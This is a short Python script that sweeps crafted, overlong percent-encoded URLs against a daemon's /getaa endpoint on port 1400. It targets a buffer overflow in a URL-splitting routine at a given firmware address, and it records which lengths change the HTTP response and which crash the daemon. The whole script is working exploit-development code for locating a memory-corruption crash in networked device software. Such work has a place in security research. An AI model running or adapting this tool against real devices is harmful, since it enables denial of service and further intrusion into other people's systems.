#!/usr/bin/env python3
"""Sweep the URL-span overflow on the S1 URL splitter (0x1007b2c4).

Delivery shape: GET /getaa?u=<percent-encoded url>. The splitter's span is
`second_slash_after_url+14 - url + 1`, so the url is built as

    http://h/ + 'a'*(N-12) + '/' + 'a' + '/b'      -> span == N

Every N is recorded with the HTTP code, the wall time and whether the daemon is
still alive afterwards. Prints the first N that stops answering 404 and the
first N that kills the daemon.

usage: urlspan.py [IP] [--lo 3900] [--hi 6000] [--step 10]
"""
import subprocess
import sys
import time
import urllib.parse

IP = sys.argv[1] if len(sys.argv) > 1 and not sys.argv[1].startswith('-') else '192.168.4.202'
args = sys.argv[1:]
def opt(name, default):
    return int(args[args.index(name) + 1]) if name in args else default
LO, HI, STEP = opt('--lo', 3900), opt('--hi', 6000), opt('--step', 10)


def curl(url, timeout=8):
    p = subprocess.run(['curl', '-s', '-m', str(timeout), '-o', '/dev/null',
                        '-w', '%{http_code}:%{time_total}', url], capture_output=True, text=True)
    return p.stdout.strip() if p.returncode == 0 else 'rc%d:0' % p.returncode


def alive():
    return curl('http://%s:1400/status/zp' % IP, 3).split(':')[0] == '200'


def wait_alive(tries=20):
    for _ in range(tries):
        if alive():
            return True
        time.sleep(0.5)
    return False


def url_for(n):
    return 'http://h/' + 'a' * (n - 12) + '/' + 'a' + '/b'


def probe(n):
    u = urllib.parse.quote(url_for(n), safe='')
    return curl('http://%s:1400/getaa?u=%s' % (IP, u))


def main():
    first_non404 = first_dead = None
    print('N\tcode\ttime\talive')
    for n in range(LO, HI + 1, STEP):
        if not wait_alive():
            print('%d\tdaemon-down-before' % n)
            break
        code, t = probe(n).split(':')
        ok = alive()
        print('%d\t%s\t%s\t%s' % (n, code, t, 'yes' if ok else 'NO'))
        sys.stdout.flush()
        if first_non404 is None and code != '404':
            first_non404 = n
        if first_dead is None and not ok:
            first_dead = n
        if not ok and not wait_alive():
            print('# daemon did not come back after N=%d' % n)
            break
    print('# first N not answering 404: %s' % first_non404)
    print('# first N killing the daemon: %s' % first_dead)


if __name__ == '__main__':
    main()
